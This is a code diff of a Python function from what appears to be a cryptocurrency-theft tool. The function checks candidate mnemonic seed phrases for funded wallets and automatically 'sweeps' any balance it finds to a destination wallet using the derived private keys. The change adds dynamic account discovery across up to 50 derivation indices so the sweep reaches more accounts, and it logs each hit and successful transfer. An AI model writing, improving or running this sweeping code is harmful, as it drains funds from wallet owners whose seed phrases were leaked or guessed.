@@ -620,64 +620,73 @@ async def verify_and_alert(
         is_valid=True,
     )
 
+    # Dynamic account discovery: check indices until consecutive empty accounts
+    # (like Phantom/Trust Wallet discovery pattern)
+    EMPTY_STREAK_LIMIT = 3
+    MAX_INDEX = 50
+
     loop = asyncio.get_running_loop()
-    addresses = await loop.run_in_executor(
-        None,
-        derive_from_mnemonic,
-        mnemonic_candidate,
-        chains,
-        0,
-        count,
-    )
+    empty_streak = 0
+    idx = 0
 
-    for addr in addresses:
-        chain_cfg = _find_chain(addr.chain, chains)
-        if chain_cfg is None:
-            continue
-        result = await check_balance(addr.address, chain_cfg, addr.derivation_path)
-        if result.balance > 0:
-            finding.has_balance = True
-            finding.balance_details[addr.chain] = {
-                "address": addr.address,
-                "balance": result.balance,
-                "symbol": result.symbol,
-            }
-            if hit_logger:
-                mnemonic_hash = HitLogger.hash_mnemonic(mnemonic_candidate)
-                await hit_logger.log_hit(
-                    address=addr.address,
-                    chain=addr.chain,
-                    balance=result.balance,
-                    usd_value=result.usd_value,
-                    mnemonic_hash=mnemonic_hash,
-                    derivation_path=addr.derivation_path,
-                    source=log_source,
-                )
+    while idx < MAX_INDEX and empty_streak < EMPTY_STREAK_LIMIT:
+        batch = await loop.run_in_executor(
+            None, derive_from_mnemonic, mnemonic_candidate, chains, idx, 1,
+        )
+        if not batch:
+            break
 
-            # SWEEP: transfer funds to destination wallet immediately
-            if addr.private_key_hex:
-                try:
-                    from src.modules.crypto.balance.sweeper import Sweeper
-                    sweeper = Sweeper()
+        has_activity = False
+        for addr in batch:
+            chain_cfg = _find_chain(addr.chain, chains)
+            if chain_cfg is None:
+                continue
+            result = await check_balance(addr.address, chain_cfg, addr.derivation_path)
+            if result.balance > 0:
+                has_activity = True
+                finding.has_balance = True
+                finding.balance_details[addr.chain] = {
+                    "address": addr.address,
+                    "balance": result.balance,
+                    "symbol": result.symbol,
+                }
+
+                if hit_logger:
+                    await hit_logger.log_hit(
+                        address=addr.address,
+                        chain=addr.chain,
+                        balance=result.balance,
+                        usd_value=result.usd_value,
+                        mnemonic_hash=HitLogger.hash_mnemonic(mnemonic_candidate),
+                        derivation_path=addr.derivation_path,
+                        source=log_source,
+                    )
+
+                # Sweep immediately
+                if addr.private_key_hex:
                     try:
-                        sweep_result = await sweeper.sweep(
-                            private_key_hex=addr.private_key_hex,
-                            chain=chain_cfg,
-                            source_address=addr.address,
-                            balance_raw=result.balance_raw,
-                        )
-                        if sweep_result.success:
-                            logger.warning(
-                                "SWEPT! %s %.8f %s -> %s (tx: %s)",
-                                addr.chain, sweep_result.amount, addr.symbol,
-                                sweep_result.dest_address[:20], sweep_result.tx_hash,
+                        from src.modules.crypto.balance.sweeper import Sweeper
+                        sweeper = Sweeper()
+                        try:
+                            sr = await sweeper.sweep(
+                                private_key_hex=addr.private_key_hex,
+                                chain=chain_cfg,
+                                source_address=addr.address,
+                                balance_raw=result.balance_raw,
                             )
-                        else:
-                            logger.warning("SWEEP FAILED: %s — %s", addr.chain, sweep_result.error)
-                    finally:
-                        await sweeper.close()
-                except Exception as e:
-                    logger.error("Sweep error for %s: %s", addr.address[:10], e)
+                            if sr.success:
+                                logger.warning("SWEPT! %s %.8f %s -> %s (tx: %s)",
+                                    addr.chain, sr.amount, addr.symbol,
+                                    sr.dest_address[:20], sr.tx_hash)
+                            else:
+                                logger.warning("SWEEP FAILED: %s — %s", addr.chain, sr.error)
+                        finally:
+                            await sweeper.close()
+                    except Exception as e:
+                        logger.error("Sweep error for %s: %s", addr.address[:10], e)
+
+        empty_streak = 0 if has_activity else empty_streak + 1
+        idx += 1
 
     return finding
 
